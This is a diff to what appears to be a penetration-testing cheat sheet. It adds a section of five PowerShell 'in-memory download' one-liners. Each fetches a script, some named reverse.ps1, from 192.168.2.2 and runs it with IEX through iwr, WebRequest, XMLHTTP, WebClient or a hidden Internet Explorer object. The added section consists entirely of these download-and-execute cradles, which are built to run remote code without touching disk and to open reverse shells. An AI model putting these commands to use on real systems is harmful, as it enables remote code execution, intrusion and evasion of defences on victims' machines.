@@ -187,6 +187,37 @@ Install-Module Microsoft page\
 [https://learn.microsoft.com/en-us/powershell/module/powershellget/install-module?view=powershellget-3.x](https://learn.microsoft.com/en-us/powershell/module/powershellget/install-module?view=powershellget-3.x)
 {% endhint %}
 
+
+
+## PowerShell in -memory Download
+
+```powershell
+iex (iwr 'http://192.168.2.2/file.ps1')
+
+```
+
+```powershell
+$down = [System.NET.WebRequest]::Create("http://192.168.2.2/file.ps1")
+$read = $down.GetResponse()
+IEX ([System.IO.StreamReader]($read.GetResponseStream())).ReadToEnd()
+```
+
+```powershell
+$file=New-Object -ComObject
+Msxml2.XMLHTTP;$file.open('GET','http://192.168.2.2/file.ps1',$false);$file.sen
+d();iex $file.responseText
+```
+
+```powershell
+iex (New-Object Net.WebClient).DownloadString('https://192.168.2.2/reverse.ps1')
+```
+
+```powershell
+$ie=New-Object -ComObject
+InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.2.2/reverse.ps1 ‘);
+sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
+```
+
 ***
 
 ### PowerShell Scripts
